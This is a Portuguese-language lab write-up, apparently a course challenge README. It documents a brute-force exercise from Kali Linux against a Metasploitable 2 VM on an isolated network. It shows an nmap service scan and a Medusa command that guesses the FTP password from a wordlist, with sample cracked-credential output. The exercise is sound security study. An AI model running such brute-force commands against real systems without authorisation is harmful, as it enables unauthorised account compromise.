# Desafio DIO 

# 🔐 Laboratório de Ataque Brute Force com Kali Linux e Medusa
### 📌 Descrição

Este projeto demonstra a simulação de ataques de força bruta em um ambiente controlado, utilizando ferramentas de segurança ofensiva para compreender como ataques de autenticação funcionam e como podem ser mitigados em ambientes reais.

O laboratório foi desenvolvido utilizando o sistema operacional Kali Linux como máquina atacante e o ambiente vulnerável Metasploitable 2 como alvo.

Durante os testes, foi utilizada a ferramenta de ataque de autenticação paralela Medusa para simular ataques contra diferentes serviços.

### ⚠️ Aviso:
Todos os testes foram realizados em ambiente isolado de laboratório, exclusivamente para fins educacionais e de estudo em segurança da informação.

# 🎯 Objetivos do Projeto

Este projeto tem como objetivo:
* Demonstrar como funcionam ataques de força bruta em serviços de rede
* Utilizar ferramentas de pentest em ambiente controlado
* Identificar vulnerabilidades relacionadas a autenticação fraca
* Documentar processos técnicos de forma estruturada
* Apresentar medidas de mitigação e boas práticas de segurança


# 🧪 Ambiente de Laboratório

O laboratório foi configurado utilizando virtualização através do software:
* **Vmware Workstation Pro**

Máquinas Virtuais Utilizadas
| Máquina          | Função             |
| ---------------- | ------------------ |
| Kali Linux       | Máquina atacante   |
| Metasploitable 2 | Máquina vulnerável |

Topologia de Rede
```
Kali Linux (Attacker)
        │
        │ Host-Only Network
        │
Metasploitable 2 (Target)
```
Rede configurada como Host-Only, garantindo isolamento do ambiente externo.

# 🔍 Reconhecimento de Serviços

Antes da execução dos ataques, foi realizado reconhecimento da superfície de ataque utilizando a ferramenta de varredura de rede:

**Nmap**  
Comando utilizado
> nmap -sV 192.168.56.101

Resultado esperado
Identificação de serviços vulneráveis como:

* FTP (21)
* SSH (22)
* HTTP (80)
* SMB (445)
  
Esse processo é fundamental para identificar serviços que podem ser alvo de ataques de autenticação.

# ⚔️ Ataque de Força Bruta em FTP

O primeiro teste foi realizado contra o serviço FTP presente na máquina vulnerável.

Comando utilizado
> medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp

**Parâmetros utilizados**
| Parâmetro | Função             |
| --------- | ------------------ |
| -h        | Host alvo          |
| -u        | Usuário            |
| -P        | Wordlist de senhas |
| -M        | Módulo do serviço  |  

Resultado esperado  
Caso a senha esteja presente na wordlist:  
> ACCOUNT FOUND: [ftp] Host: 192.168.170.129 User: msfadmin Password: msfadmin

Esse resultado demonstra como credenciais fracas podem ser facilmente comprometidas.


































